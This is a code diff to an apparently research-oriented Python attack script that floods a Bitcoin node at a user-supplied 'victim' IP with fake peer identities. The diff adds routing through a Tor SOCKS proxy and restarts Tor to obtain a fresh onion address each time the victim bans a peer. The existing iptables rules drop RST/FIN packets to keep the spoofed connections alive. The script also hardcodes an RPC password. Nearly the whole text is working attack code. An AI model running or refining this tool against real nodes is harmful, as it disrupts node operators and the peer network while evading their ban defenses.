@@ -1,10 +1,12 @@
 from _thread import start_new_thread
+from bitcoin.core import CBlock
 from bitcoin.messages import *
 from bitcoin.net import CAddress
-from bitcoin.core import CBlock
 from io import BytesIO as _BytesIO
 import atexit
+import base64
 import bitcoin
+import datetime
 import fcntl
 import hashlib
 import json
@@ -12,21 +14,30 @@ import os
 import random
 import re
 import socket
+import socks
 import struct
 import sys
 import time
-import datetime
-import base64
 
+connectSybilThroughTor = True
 sendOnlyOneMessagePerIdentity = True
 networkType = 'ipv4'
+
+# Define Tor proxy settings (default Tor SOCKS proxy settings)
+TOR_PROXY_HOST = '127.0.0.1'
+TOR_PROXY_PORT = 9050
 
 
 if os.geteuid() != 0:
 	sys.exit("\nYou need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.\n")
 
-# Specify the attacker's genuine IP
-attacker_ip = input('\nEnter attacker\'s IP address: ')
+if not connectSybilThroughTor:
+	# Specify the attacker's genuine IP
+	attacker_ip = input('\nEnter attacker\'s IP address: ')
+else:
+	# Automatically read the attacker's onion address when using Tor
+	attacker_ip = read_onion_address()
+	print(f"\nUsing attacker's Onion address: {attacker_ip}")
 
 # Specify the victim's IP, and port (8333 for Bitcoin)
 victim_ip = input('Enter victim\'s IP address: ')
@@ -60,6 +71,28 @@ def terminal(cmd):
 # Send commands to the Bitcoin Core Console
 def bitcoin(cmd):
 	return os.popen('./../../src/bitcoin-cli -rpcuser=cybersec -rpcpassword=kZIdeN4HjZ3fp9Lge4iezt0eJrbjSi8kuSuOHeUkEUbQVdf09JZXAAGwF3R5R2qQkPgoLloW91yTFuufo7CYxM2VPT7A5lYeTrodcLWWzMMwIrOKu7ZNiwkrKOQ95KGW8kIuL1slRVFXoFpGsXXTIA55V3iUYLckn8rj8MZHBpmdGQjLxakotkj83ZlSRx1aOJ4BFxdvDNz0WHk1i2OPgXL4nsd56Ph991eKNbXVJHtzqCXUbtDELVf4shFJXame -rpcport=8332 ' + cmd).read()
+
+# Function to read the onion address from the hosts file
+def read_onion_address():
+	torrc_path = os.path.join(os.getcwd(), 'tor-researcher', 'torrc', 'hosts')
+	try:
+		with open(torrc_path, 'r') as file:
+			onion_address = file.readline().strip()  # Read the first line containing the onion address
+		return onion_address
+	except FileNotFoundError:
+		print(f"Error: The file 'hosts' was not found in '{torrc_path}'.")
+		sys.exit(1)
+
+# Function to restart Tor
+def restart_tor():
+	print("Restarting Tor...")
+	# Stop Tor
+	stop_command = os.path.join('.', 'tor-researcher', 'stop.sh')
+	terminal(stop_command)
+	# Start Tor
+	start_command = os.path.join('.', 'tor-researcher', 'run.sh')
+	terminal(start_command)
+	print("Tor restarted successfully.")
 
 # Generate a random identity using the broadcast address template
 def random_ip():
@@ -175,38 +208,49 @@ def close_connection(socket, ip, port, interface):
 	if (ip, port) in identity_address: identity_address.remove((ip, port))
 	print(f'Successfully closed connection to ({ip} : {port})')
 
+
 # Creates a fake connection to the victim
 def make_fake_connection(src_ip, dst_ip, verbose=True):
-	src_port = random.randint(1024, 65535)
-	dst_port = victim_port
-	print(f'Creating fake identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')
 
-	interface = ip_alias(src_ip)
-	identity_interface.append(interface)
-	if verbose: print(f'Successfully set up IP alias on interface {interface}')
-	if verbose: print('Resulting ifconfig interface:')
-	if verbose: print(terminal(f'ifconfig {interface}').rstrip() + '\n')
+	if connectSybilThroughTor:
+		# Configure the socket to route through Tor
+		s = socks.socksocket()
+		s.set_proxy(socks.SOCKS5, TOR_PROXY_HOST, TOR_PROXY_PORT)
+		src_port = random.randint(1024, 65535)  # Port number is still required for the socket API, but not used by Tor
+		if verbose: print(f'Connecting through Tor to ({dst_ip} : {victim_port})...')
 
-	if verbose: print('Setting up iptables configurations')
-	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST,ACK -j DROP')
-	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN,ACK -j DROP')
-	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN -j DROP')
-	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST -j DROP')
+	else:
 
-	if verbose: print('Creating network socket...')
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		src_port = random.randint(1024, 65535)
+		dst_port = victim_port
+		print(f'Creating fake identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')
 
-	if verbose: print(f'Setting socket network interface to "{network_interface}"...')
-	success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
-	while success == -1:
-		print(f'Setting socket network interface to "{network_interface}"...')
+		interface = ip_alias(src_ip)
+		identity_interface.append(interface)
+		if verbose: print(f'Successfully set up IP alias on interface {interface}')
+		if verbose: print('Resulting ifconfig interface:')
+		if verbose: print(terminal(f'ifconfig {interface}').rstrip() + '\n')
+
+		if verbose: print('Setting up iptables configurations')
+		terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST,ACK -j DROP')
+		terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN,ACK -j DROP')
+		terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN -j DROP')
+		terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST -j DROP')
+
+		if verbose: print('Creating network socket...')
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+		if verbose: print(f'Setting socket network interface to "{network_interface}"...')
 		success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
-		time.sleep(1)
-		print(network_interface)
+		while success == -1:
+			print(f'Setting socket network interface to "{network_interface}"...')
+			success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
+			time.sleep(1)
+			print(network_interface)
 
 
-	if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
-	s.bind((src_ip, src_port))
+		if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
+		s.bind((src_ip, src_port))
 
 	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
 	try:
@@ -234,17 +278,21 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 
 	# Listen to the connections for future packets
 	if verbose: print(f'Attaching attacker script {interface}')
-	try:
-		start_new_thread(attack, (), {
-			'socket': s,
-			'src_ip': src_ip,
-			'src_port': src_port,
-			'dst_ip': dst_ip,
-			'dst_port': dst_port,
-			'interface': interface
-		})
-	except:
-		print('Error: unable to  start thread to sniff interface {interface}')
+	
+	if not connectSybilThroughTor:
+		try:
+			start_new_thread(attack, (), {
+				'socket': s,
+				'src_ip': src_ip,
+				'src_port': src_port,
+				'dst_ip': dst_ip,
+				'dst_port': dst_port,
+				'interface': interface
+			})
+		except:
+			print('Error: unable to  start thread to sniff interface {interface}')
+	else:
+		print('Tor does not support simultaneous connections.')
 
 # Send addr repeatedly, or only once per identity based on sendOnlyOneMessagePerIdentity
 def attack(socket, src_ip, src_port, dst_ip, dst_port, interface):
@@ -260,6 +308,9 @@ def attack(socket, src_ip, src_port, dst_ip, dst_port, interface):
 		finally:
 			close_connection(socket, src_ip, src_port, interface)
 			print(f'Connection closed after sending one message ({src_ip} : {src_port})')
+			if connectSybilThroughTor:
+				# Restart Tor to get a new onion address
+				restart_tor()
 	else:
 		while True:
 			if seconds_between_version_packets != 0:
@@ -273,6 +324,9 @@ def attack(socket, src_ip, src_port, dst_ip, dst_port, interface):
 
 		close_connection(socket, src_ip, src_port, interface)
 		print(f'Peer was banned ({src_ip} : {src_port})')
+		if connectSybilThroughTor:
+			# Restart Tor to get a new onion address
+			restart_tor()
 
 # Initialize the network
 def initialize_network_info():
